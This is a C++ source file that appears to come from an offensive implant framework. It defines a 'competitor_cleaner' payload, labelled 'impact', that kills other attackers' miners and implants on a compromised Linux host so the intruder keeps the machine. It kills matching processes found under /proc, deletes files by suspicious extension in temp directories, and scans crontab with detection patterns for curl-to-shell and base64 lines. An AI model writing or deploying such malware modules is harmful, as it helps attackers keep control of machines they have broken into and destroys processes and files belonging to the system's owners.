#include <dirent.h>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>

#include <algorithm>
#include <cctype>
#include <cstdlib>
#include <functional>
#include <regex>
#include <string>
#include <vector>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

bool parse_leading_int(const std::string& s, int& out) {
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t')) i++;
    bool neg = false;
    if (i < s.size() && (s[i] == '+' || s[i] == '-')) {
        neg = (s[i] == '-');
        i++;
    }
    size_t start = i;
    long v = 0;
    while (i < s.size() && s[i] >= '0' && s[i] <= '9') {
        v = v * 10 + (s[i] - '0');
        i++;
    }
    if (i == start) return false;
    out = (int)(neg ? -v : v);
    return true;
}

void walk(const std::string& root, const std::function<void(const std::string&, bool)>& fn) {
    struct stat st;
    if (::lstat(root.c_str(), &st) != 0) return;
    bool is_dir = S_ISDIR(st.st_mode);
    fn(root, is_dir);
    if (!is_dir) return;

    DIR* d = ::opendir(root.c_str());
    if (d == nullptr) return;
    std::vector<std::string> names;
    while (struct dirent* e = ::readdir(d)) {
        std::string n = e->d_name;
        if (n == "." || n == "..") continue;
        names.push_back(n);
    }
    ::closedir(d);
    std::sort(names.begin(), names.end());
    for (const auto& n : names) walk(root + "/" + n, fn);
}

std::string ext_lower(const std::string& path) {
    for (long i = (long)path.size() - 1; i >= 0; --i) {
        char c = path[(size_t)i];
        if (c == '/') break;
        if (c == '.') {
            std::string e = path.substr((size_t)i);
            for (char& ch : e) ch = (char)::tolower((unsigned char)ch);
            return e;
        }
    }
    return "";
}

struct CompItem {
    int pid = 0;
    std::string name;
    std::string path;
    std::string entry;
    std::string reason;
    bool removed = false;
};

OJ item_json(const CompItem& it) {
    OJ o = OJ::object();
    if (it.pid != 0) o["pid"] = it.pid;
    o["name"] = it.name;
    if (!it.path.empty()) o["path"] = it.path;
    if (!it.entry.empty()) o["entry"] = it.entry;
    o["reason"] = it.reason;
    o["removed"] = it.removed;
    return o;
}

const char* const kSuspiciousProcessNames[] = {"minerd",  "cpuminer", "xmrig",  "ccminer",
                                               "ethminer", "javaw",    "svchost"};

void scan_processes(OJ& processes, OJ& statuses, int& removed) {
    DIR* d = ::opendir("/proc");
    if (d == nullptr) return;
    std::vector<std::string> entries;
    while (struct dirent* e = ::readdir(d)) entries.push_back(e->d_name);
    ::closedir(d);

    for (const auto& e : entries) {
        int pid = 0;
        parse_leading_int(e, pid);
        if (pid == 0 || pid == (int)::getpid()) continue;
        std::string comm;
        if (!read_file("/proc/" + std::to_string(pid) + "/comm", comm)) continue;
        std::string name = trim(comm);
        if (name.empty()) continue;
        std::string lower = name;
        for (char& c : lower) c = (char)::tolower((unsigned char)c);
        for (const char* sp : kSuspiciousProcessNames) {
            if (lower.find(sp) == std::string::npos) continue;
            CompItem it;
            it.pid = pid;
            it.name = name;
            it.reason = "Matching process: " + std::string(sp);
            if (mut_kill_process(pid)) {
                it.removed = true;
                removed++;
            }
            processes.push_back(item_json(it));
            statuses.push_back("Killed process: " + name + " (PID " + std::to_string(pid) + ")");
            break;
        }
    }
}

const char* const kSuspiciousExts[] = {".miner", ".bot", ".malware", ".backdoor", ".crypt"};

void scan_files(OJ& files, OJ& statuses, int& removed) {
    for (const char* dir : {"/tmp", "/dev/shm", "/var/tmp"}) {
        walk(dir, [&](const std::string& path, bool is_dir) {
            if (is_dir) return;
            std::string ext = ext_lower(path);
            for (const char* se : kSuspiciousExts) {
                if (ext != se) continue;
                CompItem it;
                it.path = path;
                it.reason = "Suspicious extension: " + ext;
                if (mut_remove(path)) {
                    it.removed = true;
                    removed++;
                }
                files.push_back(item_json(it));
                statuses.push_back("Removed file: " + path);
                return;
            }
        });
    }
}

const char* const kSuspiciousCronPatterns[] = {"curl.*\\|.*sh", "wget.*-O.*\\.sh",
                                               "python.*http",  "perl.*-e",
                                               "base64.*decode"};

void scan_crons(OJ& crons, OJ& statuses) {
    CmdResult out = run_argv_combined({"crontab", "-l"});
    if (out.out.empty()) return;
    for (const char* pat : kSuspiciousCronPatterns) {
        std::regex re(pat, std::regex::ECMAScript);
        for (std::sregex_iterator it(out.out.begin(), out.out.end(), re), end; it != end; ++it) {
            CompItem ci;
            ci.entry = it->str();
            ci.reason = "Suspicious cron pattern";
            crons.push_back(item_json(ci));
            statuses.push_back("Found suspicious cron: " + ci.entry);
        }
    }
}

class CompetitorCleaner : public Payload {
  public:
    const char* name() const override { return "competitor_cleaner"; }
    const char* category() const override { return "impact"; }
    const char* description() const override {
        return "Detect and remove competing implants, backdoors, and miners";
    }

    Output execute(const Args&) const override {
        OJ processes = OJ::array();
        OJ files = OJ::array();
        OJ crons = OJ::array();
        OJ statuses = OJ::array();
        int removed = 0;

        scan_processes(processes, statuses, removed);
        scan_files(files, statuses, removed);
        scan_crons(crons, statuses);

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();
        r["suspicious_processes"] = processes.empty() ? OJ(nullptr) : processes;
        r["suspicious_files"] = files.empty() ? OJ(nullptr) : files;
        r["suspicious_crons"] = crons.empty() ? OJ(nullptr) : crons;
        r["removed"] = removed;
        r["statuses"] = statuses.empty() ? OJ(nullptr) : statuses;

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

CompetitorCleaner g_competitor_cleaner;

struct Reg { Reg() { Register(&g_competitor_cleaner); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
